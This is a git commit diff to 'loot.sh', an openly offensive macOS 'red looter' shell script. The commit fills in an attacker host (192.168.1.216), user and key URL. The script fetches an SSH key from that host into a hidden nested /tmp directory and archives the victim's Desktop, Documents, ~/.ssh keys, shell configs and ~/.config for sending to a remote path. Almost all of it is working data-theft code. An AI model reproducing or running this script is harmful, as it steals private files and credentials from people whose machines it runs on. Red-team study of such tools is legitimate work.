bed59a8df8a0c92548fda3328e160c64b677b24b
un1x01d <>
2022-08-19 13:09:04 -0400

    temp script

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -1,16 +1,16 @@
 #!/bin/bash
 
 HOME="/Users/$USER"
-SSH_HOST=""
-SSH_USER=""
-SSH_KEY_URL=""
+SSH_HOST="192.168.1.216"
+SSH_USER="zed"
+SSH_KEY_URL="http://192.168.1.216/sh"
 LOCAL_LOOT_PATH="/tmp/.s/.t/.e/.a/.l/"
 REMOTE_LOOT_PATH="~/demo/"
 
 
 mkdir -p $LOCAL_LOOT_PATH
 curl -s http://192.168.1.216/sh -o $LOCAL_LOOT_PATH/.s 
-chmod 600 /tmp/.s/.t/.e/.a/.l/.s
+chmod 600 $LOCAL_LOOT_PATH/.s
 
 cd $LOCAL_LOOT_PATH
 tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
